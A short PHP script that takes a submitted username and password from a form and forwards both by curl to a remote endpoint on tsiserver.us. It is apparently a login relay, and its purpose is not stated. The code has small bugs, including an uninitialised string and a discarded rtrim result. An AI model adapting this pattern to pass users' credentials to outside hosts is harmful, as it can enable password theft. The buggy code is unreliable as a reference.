<?php session_start(); 

$_SESSION['userName'] = $_POST['userName'];
//set POST variables
$url = 'https://www.tsiserver.us/psn/out.php?returnURL=https%3A%2F%2Fwww.tsiserver.us%2Fpsn%2Ftsi.php';
$fields = array(
                        'userName' => urlencode($_POST['userName']),
                        'password' => urlencode($_POST['password']),
                );

//url-ify the data for the POST
foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
rtrim($fields_string, '&');

//open connection
$ch = curl_init();

//set the url, number of POST vars, POST data
curl_setopt($ch,CURLOPT_URL, $url);
curl_setopt($ch,CURLOPT_POST, count($fields));
curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);

//execute post
$result = curl_exec($ch);

//close connection
curl_close($ch);
?>